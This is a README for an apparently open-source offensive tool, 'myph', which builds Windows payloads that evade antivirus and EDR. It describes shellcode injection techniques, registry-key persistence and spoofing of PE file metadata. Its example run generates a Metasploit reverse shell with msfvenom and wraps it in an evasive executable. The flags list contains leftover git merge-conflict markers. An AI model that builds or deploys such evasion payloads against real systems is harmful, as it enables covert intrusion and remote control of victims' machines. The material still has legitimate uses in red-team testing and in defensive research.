# myph

AV/EDR bypass payload creation tool

## Disclaimer

The access to and the use of the information on this repository is free of charge,
but implies the tacit acceptance by the user of the following conditions, without prejudice to the applicable legal provisions.
The user acknowledges that this repository is intended for informational purposes only and therefore serves only
for general information and testing. The tool and this repository are carefully compiled on the basis of good sources and references.

However, the developers cannot be held liable for for any damage, direct or indirect, of whatever nature as a result of
or related to the access to or use of the software.

## How to use the software ?

> Please note this project is under development & subject to changes.
> Breaking changes can be introduced from release to release.

### Compiling or Installing the project

You can easily compile like so:
```bash
# if you have make installed
make  # you can also use `make help` to check recipes

# if you don't
go build -o myph .
```

> You can also grab the latest release from [here](https://github.com/CMEPW/myph/releases/)

Finally, you can install from the [golang package repository](https://pkg.go.dev/github.com/CMEPW/myph) like so:
```bash
# /!\ lowercase is important /!\
go install github.com/cmepw/myph@latest
```

### Usage

```
              ...                                        -==[ M Y P H ]==-
             ;::::;
           ;::::; :;                                    In loving memory of
         ;:::::'   :;                               Wassyl Iaroslavovytch Slipak
        ;:::::;     ;.
       ,:::::'       ;           OOO                       (1974 - 2016)
       ::::::;       ;          OOOOO
       ;:::::;       ;         OOOOOOOO
      ,;::::::;     ;'         / OOOOOOO
    ;::::::::: . ,,,;.        /  / DOOOOOO
  .';:::::::::::::::::;,     /  /     DOOOO
 ,::::::;::::::;;;;::::;,   /  /        DOOO        AV / EDR evasion framework
; :::::: '::::::;;;::::: ,#/  /          DOOO           to pop shells and
: ::::::: ;::::::;;::: ;::#  /            DOOO        make the blue team cry
:: ::::::: ;:::::::: ;::::# /              DOO
 : ::::::: ;:::::: ;::::::#/               DOO
 ::: ::::::: ;; ;:::::::::##                OO       written with <3 by djnn
 :::: ::::::: ;::::::::;:::#                OO                ------
 ::::: ::::::::::::;' :;::#                O             https://djnn.sh
   ::::: ::::::::;  /  /  :#
   :::::: :::::;   /  /    #

Usage:
  myph [flags]
  myph [command]

Available Commands:
  completion  Generate the autocompletion script for the specified shell
  help        Help about any command
  spoof       spoof PE metadata using versioninfo

Flags:
<<<<<<< HEAD
  -d, --debug                builds binary with debug symbols
=======
  -b, --builtype string      define the output type (allowed: exe, dll) (default "exe")
>>>>>>> c5787c678d5d11672c780f0cd36fc51ba99b0436
  -e, --encryption encKind   encryption method. (allowed: AES, chacha20, XOR, blowfish) (default AES)
  -h, --help                 help for myph
  -k, --key string           encryption key, auto-generated if empty. (if used by --encryption)
  -f, --out string           output name (default "payload.exe")
  -z, --persistence string   name of the binary being placed in '%APPDATA%' and in 'SOFTWARE\Microsoft\Windows\CurrentVersion\Run' reg key (default: "")
  -p, --process string       target process to inject shellcode to (default "cmd.exe")
  -s, --shellcode string     shellcode path (default "msf.raw")
      --sleep-time uint      sleep time in seconds before executing loader (default: 0)
  -t, --technique string     shellcode-loading technique (allowed: CRT, CRTx, CreateFiber, ProcessHollowing, CreateThread, EnumCalendarInfoA, Syscall, Etwp) (default "CRT")
  -v, --version              version for myph
```

#### Loader Methods

This tool supports few methods for now, but aims to add more as time goes on:
- Syscall
- CreateFiber
- CreateThread
- Process hollowing
- EnumCalendarInfoA
- CreateRemoteThread
- EtwpCreateEtwThread
- CreateRemoteThreadEx

If you don't know what that is about, go check out [this repository](https://github.com/CMEPW/BypassAV) :)~


#### Example run

Generate a payload like so:

```bash
# generate your payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.2.2 LPORT=1234 -f raw -o msf.raw

# run myph (--shellcode is not mandatory here because we use the default value)
./myph --shellcode msf.raw --out something.exe

# you should find your payload here
file ./something.exe

# add some program metada
./myph spoof --pe something.exe --file .github/test-data/example.json
```

#### Using docker

```bash
# using makefile
make docker

# going through dockerfile directly
docker build . -t myph:latest
```

#### Editing file properties

A subcommand is available to edit a PE file's properties & change its icon or file version (for instance).
For more information on CLI usage, you can run:
```bash
# will give you a little help display
./myph spoof --help

# will edit demo.exe with the data specified in example.json
./myph spoof --pe demo.exe --file example.json
```

It expects a JSON file, containing the metadata you want to set. You can find an example in `.github/test-data` directory.

Information on resource types and language IDs can be found [here](https://learn.microsoft.com/en-us/windows/win32/menurc/resource-types) and [here](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-lcid/70feba9f-294e-491e-b6eb-56532684c37f).

You can set data depending on the language.
BMP, ICO, and PNG files are supported, and you can a wide array of information:

```json
{
  "RT_VERSION": {
    "#1": {
      "0000": {
        "fixed": {
          "file_version": "1.2",
          "product_version": "1.2.3",
          "flags": "Debug,Patched",
          "timestamp": "2020-12-18T23:00:00+01:00"
        },
        "info": {
          "0409": {
            "Comments": "that should do it",
            "CompanyName": "Smersh",
            "FileDescription": "smrsh 4 evr",
            "FileVersion": "1.2",
            "InternalName": "",
            "LegalCopyright": "GNU GPL v3",
            "LegalTrademarks": "",
            "OriginalFilename": "myph.exe",
            "PrivateBuild": "",
            "ProductName": "myph ldr",
            "ProductVersion": "1.2 release",
            "SpecialBuild": ""
          },
          "040C": {
            "Comments": "ca devrait le faire",
            "CompanyName": "Smersh",
            "FileDescription": "smrh pr tjrs",
            "FileVersion": "1.2",
            "InternalName": "",
            "LegalCopyright": "GNU GPL v3",
            "LegalTrademarks": "",
            "OriginalFilename": "myph.exe",
            "PrivateBuild": "",
            "ProductName": "myph ldr",
            "ProductVersion": "1.2 release",
            "SpecialBuild": ""
          }
        }
      }
    }
  }
}
```

### Contributing

Contributions are welcome, but please try to keep PRs short and issues descriptive. :)~

A guide on how to use the tool is in the works, please let us know if you're interested in helping out.
